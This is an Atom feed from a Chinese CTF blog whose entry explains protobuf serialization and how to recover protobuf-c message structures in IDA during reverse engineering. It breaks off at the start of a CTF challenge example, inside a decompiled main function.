<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>S1nec-1o&#39;s B1og</title>
  
  
  <link href="http://s1nec-1o.github.io/atom.xml" rel="self"/>
  
  <link href="http://s1nec-1o.github.io/"/>
  <updated>2025-05-13T12:37:44.064Z</updated>
  <id>http://s1nec-1o.github.io/</id>
  
  <author>
    <name>s1nec-1o</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>protobuf初探</title>
    <link href="http://s1nec-1o.github.io/2025/05/13/protobuf%E5%88%9D%E6%8E%A2/"/>
    <id>http://s1nec-1o.github.io/2025/05/13/protobuf%E5%88%9D%E6%8E%A2/</id>
    <published>2025-05-13T12:35:17.000Z</published>
    <updated>2025-05-13T12:37:44.064Z</updated>
    
    <content type="html"><![CDATA[<p>Protobuf (Protocol Buffers) 是谷歌开发的一款无关平台，无关语言，可扩展，轻量级高效的序列化结构的数据格式，用于<strong>将自定义数据结构序列化成字节流，和将字节流反序列化为数据结构</strong>。所以很适合做数据存储和为不同语言，不同应用之间互相通信的数据交换格式，只要实现相同的协议格式，即后缀为proto文件被编译成不同的语言版本，加入各自的项目中，这样不同的语言可以解析其它语言通过Protobuf序列化的数据。目前官方提供c++，java，go等语言支持。</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>首先定义一个.proto文件</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">devicemsg</span>&#123;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">sint64</span> actionid = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">sint64</span> msgidx = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">sint64</span> msgsize = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">bytes</span> msgcontent = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后根据要通过c或者python来使用，来使用相应的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">protoc --c_out=. test.proto</span><br><span class="line">protoc --python_out=. test.proto</span><br></pre></td></tr></table></figure><p>c_out会生成一个<code>test.pb-c.c</code>和<code>test.pb-c.h</code>文件</p><p>python_out会生成一个<code>test_pb2.py</code>文件</p><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Devicemsg *</span><br><span class="line">       <span class="title function_">devicemsg__unpack</span></span><br><span class="line">                     <span class="params">(ProtobufCAllocator  *allocator,</span></span><br><span class="line"><span class="params">                      <span class="type">size_t</span>               len,</span></span><br><span class="line"><span class="params">                      <span class="type">const</span> <span class="type">uint8_t</span>       *data)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (Devicemsg *)</span><br><span class="line">     protobuf_c_message_unpack (&amp;devicemsg__descriptor,</span><br><span class="line">                                allocator, len, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回的是一个Devicemsg指针，三个参数：</p><ul><li>allocator一般置0即可</li><li>len是长度，通过<code>devicemsg__get_packed_size</code>获取即可</li><li>data就是指向序列化的字节流</li></ul><p>可以发现<code>devicemsg_unpack</code>就是<code>protobuf_c_message_unpack</code>的封装</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> ProtobufCMessageDescriptor devicemsg__descriptor =</span><br><span class="line">&#123;</span><br><span class="line">  PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC,</span><br><span class="line">  <span class="string">&quot;devicemsg&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Devicemsg&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Devicemsg&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="keyword">sizeof</span>(Devicemsg),</span><br><span class="line">  <span class="number">4</span>,</span><br><span class="line">  devicemsg__field_descriptors,</span><br><span class="line">  devicemsg__field_indices_by_name,</span><br><span class="line">  <span class="number">1</span>,  devicemsg__number_ranges,</span><br><span class="line">  (ProtobufCMessageInit) devicemsg__init,</span><br><span class="line">  <span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved[123] */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个结构体的定义在源码中是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCMessageDescriptor</span> &#123;</span></span><br><span class="line"><span class="comment">/** Magic value checked to ensure that the API is used correctly. */</span></span><br><span class="line"><span class="type">uint32_t</span>magic;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The qualified name (e.g., &quot;namespace.Type&quot;). */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*name;</span><br><span class="line"><span class="comment">/** The unqualified name as given in the .proto file (e.g., &quot;Type&quot;). */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*short_name;</span><br><span class="line"><span class="comment">/** Identifier used in generated C code. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*c_name;</span><br><span class="line"><span class="comment">/** The dot-separated namespace. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*package_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Size in bytes of the C structure representing an instance of this</span></span><br><span class="line"><span class="comment"> * type of message.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">size_t</span>sizeof_message;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Number of elements in `fields`. */</span></span><br><span class="line"><span class="type">unsigned</span>n_fields;</span><br><span class="line"><span class="comment">/** Field descriptors, sorted by tag number. */</span></span><br><span class="line"><span class="type">const</span> ProtobufCFieldDescriptor*fields;</span><br><span class="line"><span class="comment">/** Used for looking up fields by name. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span>*fields_sorted_by_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Number of elements in `field_ranges`. */</span></span><br><span class="line"><span class="type">unsigned</span>n_field_ranges;</span><br><span class="line"><span class="comment">/** Used for looking up fields by id. */</span></span><br><span class="line"><span class="type">const</span> ProtobufCIntRange*field_ranges;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Message initialisation function. */</span></span><br><span class="line">ProtobufCMessageInitmessage_init;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved1;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved2;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol><li>magic，一般为0x28AAEEF9</li><li>n_fields，是原本的massage有多少参数</li><li>fields，这个指向message内所有参数类型组成的一个数组，可以借此逆向分析message结构。</li></ol><p>如果需要具体分析一个结构体的组成,只需要关注<code>n_fields</code>与<code>fields</code></p><p>在本例中这样定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> ProtobufCFieldDescriptor devicemsg__field_descriptors[<span class="number">4</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;actionid&quot;</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_SINT64,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Devicemsg, actionid),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;msgidx&quot;</span>,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_SINT64,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Devicemsg, msgidx),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;msgsize&quot;</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_SINT64,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Devicemsg, msgsize),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;msgcontent&quot;</span>,</span><br><span class="line">    <span class="number">4</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_BYTES,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Devicemsg, msgcontent),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span> &#123;</span></span><br><span class="line"><span class="comment">/** Name of the field as given in the .proto file. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Tag value of the field as given in the .proto file. */</span></span><br><span class="line"><span class="type">uint32_t</span>id;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */</span></span><br><span class="line">ProtobufCLabellabel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The type of the field. */</span></span><br><span class="line">ProtobufCTypetype;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The offset in bytes of the message&#x27;s C structure&#x27;s quantifier field</span></span><br><span class="line"><span class="comment"> * (the `has_MEMBER` field for optional members or the `n_MEMBER` field</span></span><br><span class="line"><span class="comment"> * for repeated members or the case enum for oneofs).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span>quantifier_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The offset in bytes into the message&#x27;s C structure for the member</span></span><br><span class="line"><span class="comment"> * itself.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span>offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A type-specific descriptor.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the</span></span><br><span class="line"><span class="comment"> * corresponding `ProtobufCEnumDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to</span></span><br><span class="line"><span class="comment"> * the corresponding `ProtobufCMessageDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Otherwise this field is NULL.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">const</span> <span class="type">void</span>*descriptor; <span class="comment">/* for MESSAGE and ENUM types */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** The default value for this field, if defined. May be NULL. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">void</span>*default_value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A flag word. Zero or more of the bits defined in the</span></span><br><span class="line"><span class="comment"> * `ProtobufCFieldFlag` enum may be set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">uint32_t</span>flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">unsigned</span>reserved_flags;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved2;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol><li>name，名字，变量名</li><li>id，序号，即在message结构体中的顺序（等价于位置）</li><li>label，前面标记的required等标记</li><li>type，数据类型，string还是int64等</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line"> PROTOBUF_C_TYPE_INT32,      <span class="comment">/**&lt; int32 */</span></span><br><span class="line"> PROTOBUF_C_TYPE_SINT32,     <span class="comment">/**&lt; signed int32 */</span></span><br><span class="line"> PROTOBUF_C_TYPE_SFIXED32,   <span class="comment">/**&lt; signed int32 (4 bytes) */</span></span><br><span class="line"> PROTOBUF_C_TYPE_INT64,      <span class="comment">/**&lt; int64 */</span></span><br><span class="line"> PROTOBUF_C_TYPE_SINT64,     <span class="comment">/**&lt; signed int64 */</span></span><br><span class="line"> PROTOBUF_C_TYPE_SFIXED64,   <span class="comment">/**&lt; signed int64 (8 bytes) */</span></span><br><span class="line"> PROTOBUF_C_TYPE_UINT32,     <span class="comment">/**&lt; unsigned int32 */</span></span><br><span class="line"> PROTOBUF_C_TYPE_FIXED32,    <span class="comment">/**&lt; unsigned int32 (4 bytes) */</span></span><br><span class="line"> PROTOBUF_C_TYPE_UINT64,     <span class="comment">/**&lt; unsigned int64 */</span></span><br><span class="line"> PROTOBUF_C_TYPE_FIXED64,    <span class="comment">/**&lt; unsigned int64 (8 bytes) */</span></span><br><span class="line"> PROTOBUF_C_TYPE_FLOAT,      <span class="comment">/**&lt; float */</span></span><br><span class="line"> PROTOBUF_C_TYPE_DOUBLE,     <span class="comment">/**&lt; double */</span></span><br><span class="line"> PROTOBUF_C_TYPE_BOOL,       <span class="comment">/**&lt; boolean */</span></span><br><span class="line"> PROTOBUF_C_TYPE_ENUM,       <span class="comment">/**&lt; enumerated type */</span></span><br><span class="line"> PROTOBUF_C_TYPE_STRING,     <span class="comment">/**&lt; UTF-8 or ASCII string */</span></span><br><span class="line"> PROTOBUF_C_TYPE_BYTES,      <span class="comment">/**&lt; arbitrary byte sequence */</span></span><br><span class="line"> PROTOBUF_C_TYPE_MESSAGE,    <span class="comment">/**&lt; nested message */</span></span><br><span class="line">&#125; ProtobufCType;</span><br></pre></td></tr></table></figure><p>貌似是0-0Ah顺序的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line"> <span class="comment">/** A well-formed message must have exactly one of this field. */</span></span><br><span class="line"> PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * A well-formed message can have zero or one of this field (but not</span></span><br><span class="line"><span class="comment">  * more than one).</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> PROTOBUF_C_LABEL_OPTIONAL,</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * This field can be repeated any number of times (including zero) in a</span></span><br><span class="line"><span class="comment">  * well-formed message. The order of the repeated values will be</span></span><br><span class="line"><span class="comment">  * preserved.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> PROTOBUF_C_LABEL_REPEATED,</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * This field has no label. This is valid only in proto3 and is</span></span><br><span class="line"><span class="comment">  * equivalent to OPTIONAL but no &quot;has&quot; quantifier will be consulted.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> PROTOBUF_C_LABEL_NONE,</span><br><span class="line">&#125; ProtobufCLabel;</span><br></pre></td></tr></table></figure><h2 id="ida结构体"><a href="#ida结构体" class="headerlink" title="ida结构体"></a>ida结构体</h2><p>为了方便在ida中查看相关结构体,可以将上述的两个结构体插入ida,当然需要处理一些不相关的数据</p><p><strong><code>ProtobufCMessageDescriptor</code></strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCMessageDescriptor</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint32_t</span> magic;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *short_name;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *c_name;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *package_name;</span><br><span class="line">  <span class="type">size_t</span> sizeof_message;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n_fields;</span><br><span class="line">  <span class="type">const</span> ProtobufCFieldDescriptor *fields;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> *fields_sorted_by_name;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n_field_ranges;</span><br><span class="line">  <span class="type">char</span> *field_ranges;</span><br><span class="line">  __int64 message_init;</span><br><span class="line">  <span class="type">void</span> *reserved1;</span><br><span class="line">  <span class="type">void</span> *reserved2;</span><br><span class="line">  <span class="type">void</span> *reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong><code>ProtobufCFieldDescriptor</code></strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">  <span class="type">uint32_t</span> id;</span><br><span class="line">  <span class="type">int</span> label;</span><br><span class="line">  <span class="type">int</span> type;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> quantifier_offset;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> offset;</span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *descriptor;</span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *default_value;</span><br><span class="line">  <span class="type">uint32_t</span> flags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> reserved_flags;</span><br><span class="line">  <span class="type">void</span> *reserved2;</span><br><span class="line">  <span class="type">void</span> *reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上述这两个结构体可以直接导入ida，然后通过unpack来寻找即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCMessage</span> &#123;</span></span><br><span class="line"><span class="comment">/** The descriptor for this message type. */</span></span><br><span class="line"><span class="type">void</span>*descriptor;</span><br><span class="line"><span class="comment">/** The number of elements in `unknown_fields`. */</span></span><br><span class="line"><span class="type">unsigned</span>n_unknown_fields;</span><br><span class="line"><span class="comment">/** The fields that weren&#x27;t recognized by the parser. */</span></span><br><span class="line"><span class="type">void</span>*unknown_fields;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCBinaryData</span> &#123;</span></span><br><span class="line"><span class="type">size_t</span>len;        <span class="comment">/**&lt; Number of bytes in the `data` field. */</span></span><br><span class="line"><span class="type">uint8_t</span>*data;      <span class="comment">/**&lt; Data bytes. */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>  _<span class="title">Devicemsg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  ProtobufCMessage base;</span><br><span class="line">  <span class="type">int64_t</span> giaoid;</span><br><span class="line">  <span class="type">int64_t</span> giaosize;</span><br><span class="line">  ProtobufCBinaryData giaocontent;</span><br><span class="line">  ProtobufCBinaryData giaotoken;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个<code>_Devicemsg</code>要通过<code>proto -c_out=. xxx.proto</code>有一个.h文件，其中就可以找到对应的定义，然后unpack的返回值就是这个结构体了</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="2025ccb决赛-orw"><a href="#2025ccb决赛-orw" class="headerlink" title="2025ccb决赛_orw"></a>2025ccb决赛_orw</h3><p>有花指令，简单去花：首先把一些恒真的指令给置为jmp，再把一些间接跳转换成直接跳转，然后再把main函数给<code>create function</code></p><blockquote><p>edit-&gt;function-&gt;create function</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD v3[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">1</span>] = __readfsqword(<span 